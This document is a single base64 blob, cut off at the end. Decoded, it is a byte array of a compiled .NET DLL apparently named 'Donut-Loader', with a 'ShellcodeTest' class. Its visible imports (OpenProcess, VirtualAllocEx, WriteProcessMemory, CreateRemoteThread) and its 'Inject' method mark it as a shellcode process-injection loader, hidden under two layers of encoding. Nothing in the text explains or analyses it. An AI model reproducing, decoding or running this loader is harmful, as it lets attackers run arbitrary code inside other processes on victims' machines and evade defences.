AsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCAyLCAwLCA1LCAwLCAxMzIsIDMzLCAwLCAwLCAxNDQsIDExLCAwLCAwLCAxLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxOSwgNDgsIDMsIDAsIDYyLCAwLCAwLCAwLCAxLCAwLCAwLCAxNywgMCwgMiwgMTQyLCAxMDUsIDIzLCAyNTQsIDIsIDEwLCA2LCA0NSwgMTMsIDIsIDIyLCAxNTQsIDQwLCAxNiwgMCwgMCwgMTAsIDEyOCwgMTIsIDAsIDAsIDQsIDIsIDIzLCAxNTQsIDEyOCwgMTEsIDAsIDAsIDQsIDIsIDIzLCAxNTQsIDEyOCwgMTAsIDAsIDAsIDQsIDEyNiwgMTEsIDAsIDAsIDQsIDEyNiwgMTAsIDAsIDAsIDQsIDEyNiwgMTIsIDAsIDAsIDQsIDQwLCA4LCAwLCAwLCA2LCAzOCwgNDIsIDAsIDAsIDE5LCA0OCwgNywgMCwgMTQwLCAwLCAwLCAwLCAyLCAwLCAwLCAxNywgMCwgNCwgNDAsIDE4LCAwLCAwLCAxMCwgMTAsIDYsIDExMSwgMTksIDAsIDAsIDEwLCA0MCwgMjAsIDAsIDAsIDEwLCAwLCA2LCA0MCwgMTAsIDAsIDAsIDYsIDIyLCAyNTQsIDEsIDE5LCA3LCAxNywgNywgNDUsIDQsIDIsIDExLCA0MywgMiwgMywgMTEsIDcsIDQwLCAyMSwgMCwgMCwgMTAsIDEyLCAzMiwgNTgsIDQsIDAsIDAsIDIyLCA2LCAxMTEsIDE5LCAwLCAwLCAxMCwgNDAsIDIsIDAsIDAsIDYsIDEzLCA5LCAxMjYsIDIyLCAwLCAwLCAxMCwgOCwgMTQyLCAxMDUsIDE4NCwgMzIsIDAsIDQ4LCAwLCAwLCAzMSwgNjQsIDQwLCA1LCAwLCAwLCA2LCAxOSwgNCwgOSwgMTcsIDQsIDgsIDgsIDE0MiwgMTA1LCAxODQsIDE4LCA1LCA0MCwgNiwgMCwgMCwgNiwgMzgsIDksIDEyNiwgMjIsIDAsIDAsIDEwLCAyMiwgMTcsIDQsIDEyNiwgMjIsIDAsIDAsIDEwLCAyMiwgMTI2LCAyMiwgMCwgMCwgMTAsIDQwLCA3LCAwLCAwLCA2LCAzOCwgMjIsIDE5LCA2LCA0MywgMCwgMTcsIDYsIDQyLCAxOSwgNDgsIDIsIDAsIDIzLCAwLCAwLCAwLCAzLCAwLCAwLCAxNywgMCwgMjIsIDEwLCAyLCAxMTEsIDIzLCAwLCAwLCAxMCwgMTgsIDAsIDQwLCA5LCAwLCAwLCA2LCAzOCwgNiwgMTEsIDQzLCAwLCA3LCA0MiwgMTQ2LCAxMTQsIDEsIDAsIDAsIDExMiwgMTI4LCAxMCwgMCwgMCwgNCwgMTE0LCAxLCAwLCAwLCAxMTIsIDEyOCwgMTEsIDAsIDAsIDQsIDQwLCAyNCwgMCwgMCwgMTAsIDExMSwgMTksIDAsIDAsIDEwLCAxMjgsIDEyLCAwLCAwLCA0LCA0MiwgMzAsIDIsIDQwLCAyNSwgMCwgMCwgMTAsIDQyLCA2NiwgODMsIDc0LCA2NiwgMSwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDExOCwgNTIsIDQ2LCA0OCwgNDYsIDUxLCA0OCwgNTEsIDQ5LCA1NywgMCwgMCwgMCwgMCwgNSwgMCwgMTA4LCAwLCAwLCAwLCA1MiwgNCwgMCwgMCwgMzUsIDEyNiwgMCwgMCwgMTYwLCA0LCAwLCAwLCA5NiwgNSwgMCwgMCwgMzUsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgMTE1LCAwLCAwLCAwLCAwLCAwLCAxMCwgMCwgMCwgNCwgMCwgMCwgMCwgMzUsIDg1LCA4MywgMCwgNCwgMTAsIDAsIDAsIDE2LCAwLCAwLCAwLCAzNSwgNzEsIDg1LCA3MywgNjgsIDAsIDAsIDAsIDIwLCAxMCwgMCwgMCwgMTI0LCAxLCAwLCAwLCAzNSwgNjYsIDEwOCwgMTExLCA5OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMiwgMCwgMCwgMSwgODcsIDI5LCAyLCAyMCwgOSwgMCwgMCwgMCwgMCwgMjUwLCAzNywgNTEsIDAsIDIyLCAwLCAwLCAxLCAwLCAwLCAwLCAyMiwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDEyLCAwLCAwLCAwLCAzMCwgMCwgMCwgMCwgMjUsIDAsIDAsIDAsIDksIDAsIDAsIDAsIDEyLCAwLCAwLCAwLCAzLCAwLCAwLCAwLCAyLCAwLCAwLCAwLCA3LCAwLCAwLCAwLCAxLCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAwLCAwLCAxMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgNiwgMCwgNjUsIDAsIDU4LCAwLCAxMCwgMCwgMTMzLCAxLCAxMTQsIDEsIDYsIDAsIDEwNSwgMiwgNzQsIDIsIDYsIDAsIDIsIDMsIDIzMiwgMiwgNiwgMCwgNDUsIDMsIDI3LCAzLCA2LCAwLCA2OCwgMywgMjcsIDMsIDYsIDAsIDk3LCAzLCAyNywgMywgNiwgMCwgMTI4LCAzLCAyNywgMywgNiwgMCwgMTUzLCAzLCAyNywgMywgNiwgMCwgMTc4LCAzLCAyNywgMywgNiwgMCwgMjA1LCAzLCAyNywgMywgNiwgMCwgMjMyLCAzLCAyNywgMywgNiwgMCwgMSwgNCwgNzQsIDIsIDYsIDAsIDIxLCA0LCAyNywgMywgNiwgMCwgNDYsIDQsIDExNCwgMSwgNjMsIDAsIDY2LCA0LCAwLCAwLCA2LCAwLCAxMTMsIDQsIDgxLCA0LCA2LCAwLCAxNDUsIDQsIDgxLCA0LCA2LCAwLCAxODgsIDQsIDU4LCAwLCA2LCAwLCAyMDQsIDQsIDc0LCAyLCA2LCAwLCAxMSwgNSwgNTgsIDAsIDYsIDAsIDQ2LCA1LCA1OCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMSwgMCwgMSwgMCwgMTYsIDAsIDI3LCAwLCAzNSwgMCwgNSwgMCwgMSwgMCwgMSwgMCwgODEsIDEyOCwgNzIsIDAsIDEwLCAwLCA4MSwgMTI4LCA5NCwgMCwgMTAsIDAsIDgxLCAxMjgsIDEyMCwgMCwgMTAsIDAsIDgxLCAxMjgsIDE0MSwgMCwgMTAsIDAsIDgxLCAxMjgsIDE1OCwgMCwgMTAsIDAsIDgxLCAxMjgsIDE3NCwgMCwgMzgsIDAsIDgxLCAxMjgsIDE4NSwgMCwgMzgsIDAsIDgxLCAxMjgsIDE5NywgMCwgMzgsIDAsIDgxLCAxMjgsIDIxMiwgMCwgMzgsIDAsIDE3LCAwLCAyMzUsIDAsIDYxLCAwLCAxNywgMCwgMjM5LCAwLCA2MSwgMCwgMTcsIDAsIDI0MywgMCwgMTAsIDAsIDgwLCAzMiwgMCwgMCwgMCwgMCwgMTUwLCAwLCAyNDcsIDAsIDY0LCAwLCAxLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDE1MCwgMzIsIDI1MiwgMCwgNzAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMTUwLCAzMiwgOCwgMSwgNzcsIDAsIDUsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMTQ1LCAzMiwgMjQsIDEsIDgyLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDE0NSwgMzIsIDM5LCAxLCA4OCwgMCwgOCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAxNDUsIDMyLCA1NCwgMSwgOTcsIDAsIDEzLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDE0NSwgMzIsIDczLCAxLCAxMDgsIDAsIDE4LCAwLCAxNTYsIDMyLCAwLCAwLCAwLCAwLCAxNTAsIDAsIDkyLCAxLCAxMTksIDAsIDI1LCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDE1MCwgMzIsIDk5LCAxLCAxMjYsIDAsIDI4LCAwLCA1MiwgMzMsIDAsIDAsIDAsIDAsIDE1MCwgMCwgOTksIDEsIDEzMywgMCwgMzAsIDAsIDEyNCwgMzMsIDAsIDAsIDAsIDAsIDEzNCwgMjQsIDE0MSwgMSwgMTM5LCAwLCAzMSwgMCwgODcsIDMzLCAwLCAwLCAwLCAwLCAxNDUsIDI0LCA2OSwgNSwgMjE5LCAwLCAzMSwgMCwgMCwgMCwgMSwgMCwgMTQ3LCAxLCAwLCAwLCAxLCAwLCAxNTIsIDEsIDAsIDAsIDIsIDAsIDE2OCwgMSwgMCwgMCwgMywgMCwgMTgzLCAxLCAwLCAwLCAxLCAwLCAxOTUsIDEsIDAsIDAsIDEsIDAsIDIwOCwgMSwgMCwgMCwgMiwgMCwgMjE2LCAxLCAwLCAwLCAxLCAwLCAyMjUsIDEsIDAsIDAsIDIsIDAsIDIzNCwgMSwgMCwgMCwgMywgMCwgMjQ0LCAxLCAwLCAwLCA0LCAwLCAyNTEsIDEsIDAsIDAsIDUsIDAsIDEyLCAyLCAwLCAwLCAxLCAwLCAyMjUsIDEsIDAsIDAsIDIsIDAsIDIyLCAyLCAwLCAwLCAzLCAwLCAzNiwgMiwgMCwgMCwgNCwgMCwgNDUsIDIsIDIsIDAsIDUsIDAsIDUxLCAyLCAwLCAwLCAxLCAwLCAyMjUsIDEsIDAsIDAsIDIsIDAsIDExOCwgMiwgMCwgMCwgMywgMCwgMTM3LCAyLCAwLCAwLCA0LCAwLCAxNDksIDIsIDAsIDAsIDUsIDAsIDE2NCwgMiwgMCwgMCwgNiwgMCwgMTc2LCAyLCAwLCAwLCA3LCAwLCAxOTIsIDIsIDAsIDAsIDEsIDAsIDIzOSwgMCwgMCwgMCwgMiwgMCwgMjM1LCAwLCAwLCAwLCAzLCAwLCAyMDMsIDIsIDAsIDAsIDEsIDAsIDIyNSwgMSwgMiwgMCwgMiwgMCwgMjExLCAyLCAwLCAwLCAxLCAwLCAyMjQsIDIsIDI1LCAwLCAxNDEsIDEsIDEzOSwgMCwgMzMsIDAsIDE0MSwgMSwgMTQzLCAwLCA0MSwgMCwgMTQxLCAxLCAxNDMsIDAsIDQ5LCAwLCAxNDEsIDEsIDE0MywgMCwgNTcsIDAsIDE0MSwgMSwgMTQzLCAwLCA2NSwgMCwgMTQxLCAxLCAxNDMsIDAsIDczLCAwLCAxNDEsIDEsIDE0MywgMCwgODEsIDAsIDE0MSwgMSwgMTQzLCAwLCA4OSwgMCwgMTQxLCAxLCAxNDMsIDAsIDk3LCAwLCAxNDEsIDEsIDE0MywgMCwgMTA1LCAwLCAxNDEsIDEsIDE0OCwgMCwgMTEzLCAwLCAxNDEsIDEsIDE0MywgMCwgMTIxLCAwLCAxNDEsIDEsIDE1MywgMCwgMTM3LCAwLCAxNDEsIDEsIDE1OSwgMCwgMTQ1LCAwLCAxNDEsIDEsIDEzOSwgMCwgMTUzLCAwLCAxOTYsIDQsIDE2NCwgMCwgMTYxLCAwLCAxNDEsIDEsIDE0MywgMCwgMTcsIDAsIDI0NSwgNCwgMTczLCAwLCAxNywgMCwgNCwgNSwgMTc5LCAwLCAxNjksIDAsIDE5LCA1LCAxODMsIDAsIDE1MywgMCwgMjksIDUsIDE4OCwgMCwgMTc3LCAwLCA1MywgNSwgMTk0LCAwLCAxNywgMCwgNTgsIDUsIDIxMCwgMCwgMTcsIDAsIDc2LCA1LCAyMjMsIDAsIDksIDAsIDE0MSwgMSwgMTM5LCAwLCA4LCAwLCA0LCAwLCAxMywgMCwgOCwgMCwgOCwgMCwgMTgsIDAsIDgsIDAsIDEyLCAwLCAyMywgMCwgOCwgMCwgMTYsIDAsIDI4LCAwLCA4LCAwLCAyMCwgMCwgMzMsIDAsIDksIDAsIDI0LCAwLCA0MSwgMCwgOSwgMCwgMjgsIDAsIDQ2LCAwLCA5LCAwLCAzMiwgMCwgNTEsIDAsIDksIDAsIDM2LCAwLCA1NiwgMCwgNDYsIDAsIDE5LCAwLCAyMjgsIDAsIDQ2LCAwLCAyNywgMCwgMjgsIDEsIDQ2LCAwLCAzNSwgMCwgNDYsIDEsIDQ2LCAwLCA0MywgMCwgNDYsIDEsIDQ2LCAwLCA1MSwgMCwgNDYsIDEsIDQ2LCAwLCA1OSwgMCwgMjgsIDEsIDQ2LCAwLCA2NywgMCwgNTIsIDEsIDQ2LCAwLCA3NSwgMCwgNDYsIDEsIDQ2LCAwLCA5MSwgMCwgNDYsIDEsIDQ2LCAwLCAxMDcsIDAsIDcyLCAxLCA0NiwgMCwgMTE1LCAwLCA4MSwgMSwgNDYsIDAsIDEyMywgMCwgOTAsIDEsIDE2OSwgMCwgMTk3LCAwLCAyMTQsIDAsIDIyMywgNCwgMjM2LCA0LCAwLCAxLCA1LCAwLCAyNTIsIDAsIDEsIDAsIDYsIDEsIDcsIDAsIDgsIDEsIDEsIDAsIDY3LCAxLCA5LCAwLCAyNCwgMSwgMiwgMCwgNjUsIDEsIDExLCAwLCAzOSwgMSwgMSwgMCwgNjQsIDEsIDEzLCAwLCA1NCwgMSwgMSwgMCwgMCwgMSwgMTUsIDAsIDczLCAxLCAxLCAwLCAwLCAxLCAxOSwgMCwgOTksIDEsIDEsIDAsIDQsIDEyOCwgMCwgMCwgMSwgMCwgMCwgMCwgMzksIDI4LCAyOCwgODAsIDAsIDAsIDAsIDAsIDAsIDAsIDE3NSwgNCwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgNDksIDAsIDAsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDU4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2MCwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA2MiwgMCwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCA0NiwgMTAwLCAxMDgsIDEwOCwgMCwgODAsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMCwgODMsIDEwNCwgMTAxLCAxMDgsIDEwOCwgOTksIDExMSwgMTAwLCAxMDEsIDg0LCAxMDEsIDExNSwgMTE2LCAwLCAxMDksIDExNSwgOTksIDExMSwgMTE0LCAxMDgsIDEwNSwgOTgsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgMCwgNzksIDk4LCAxMDYsIDEwMSwgOTksIDExNiwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA2NywgODIsIDY5LCA2NSwgODQsIDY5LCA5NSwgODQsIDcyLCA4MiwgNjksIDY1LCA2OCwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4MSwgODUsIDY5LCA4MiwgODksIDk1LCA3MywgNzgsIDcwLCA3OSwgODIsIDc3LCA2NSwgODQsIDczLCA3OSwgNzgsIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODYsIDc3LCA5NSwgNzksIDgwLCA2OSwgODIsIDY1LCA4NCwgNzMsIDc5LCA3OCwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4NiwgNzcsIDk1LCA4NywgODIsIDczLCA4NCwgNjksIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODYsIDc3LCA5NSwgODIsIDY5LCA2NSwgNjgsIDAsIDc3LCA2OSwgNzcsIDk1LCA2NywgNzksIDc3LCA3NywgNzMsIDg0LCAwLCA3NywgNjksIDc3LCA5NSwgODIsIDY5LCA4MywgNjksIDgyLCA4NiwgNjksIDAsIDgwLCA2NSwgNzEsIDY5LCA5NSwgODIsIDY5LCA2NSwgNjgsIDg3LCA4MiwgNzMsIDg0LCA2OSwgMCwgODAsIDY1LCA3MSwgNjksIDk1LCA2OSwgODgsIDY5LCA2NywgODUsIDg0LCA2OSwgOTUsIDgyLCA2OSwgNjUsIDY4LCA4NywgODIsIDczLCA4NCwgNjksIDAsIDEyMCwgNTQsIDUyLCAwLCAxMjAsIDU2LCA1NCwgMCwgMTEyLCAxMDUsIDEwMCwgMCwgNzcsIDk3LCAxMDUsIDExMCwgMCwgNzksIDExMiwgMTAxLCAxMTAsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDcxLCAxMDEsIDExNiwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA3MiwgOTcsIDExMCwgMTAwLCAxMDgsIDEwMSwgMCwgNzEsIDEwMSwgMTE2LCA4MCwgMTE0LCAxMTEsIDk5LCA2NSwgMTAwLCAxMDAsIDExNCwgMTAxLCAxMTUsIDExNSwgMCwgODYsIDEwNSwgMTE0LCAxMTYsIDExNywgOTcsIDEwOCwgNjUsIDEwOCwgMTA4LCAxMTEsIDk5LCA2OSwgMTIwLCAwLCA4NywgMTE0LCAxMDUsIDExNiwgMTAxLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCA3NywgMTAxLCAxMDksIDExMSwgMTE0LCAxMjEsIDAsIDY3LCAxMTQsIDEwMSwgOTcsIDExNiwgMTAxLCA4MiwgMTAxLCAxMDksIDExMSwgMTE2LCAxMDEsIDg0LCAxMDQsIDExNCwgMTAxLCA5NywgMTAwLCAwLCA3MywgMTEwLCAxMDYsIDEwMSwgOTksIDExNiwgMCwgNzMsIDExNSwgODcsIDExMSwgMTE5LCA1NCwgNTIsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDY4LCAxMDUsIDk3LCAxMDMsIDExMCwgMTExLCAxMTUsIDExNiwgMTA1LCA5OSwgMTE1LCAwLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA0NiwgOTksIDExNiwgMTExLCAxMTQsIDAsIDk3LCAxMTQsIDEwMywgMTE1LCAwLCAxMDAsIDExOSwgNjgsIDEwMSwgMTE1LCAxMDUsIDExNCwgMTAxLCAxMDAsIDY1LCA5OSwgOT